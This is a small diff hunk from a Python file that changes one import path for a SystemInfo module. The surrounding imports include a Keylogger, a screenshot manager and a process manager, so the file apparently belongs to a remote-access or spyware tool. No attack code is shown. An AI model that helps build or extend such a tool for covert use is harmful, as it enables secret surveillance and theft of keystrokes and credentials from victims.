@@ -10,7 +10,7 @@ from protocol import Protocol
 from process_manager import ProcessManager
 from keylogger import Keylogger
 from screenshotManager import take_screenshot, ScreenshotManager
-from UserInfo.System_info import SystemInfo
+from System_info import SystemInfo
 
 
 
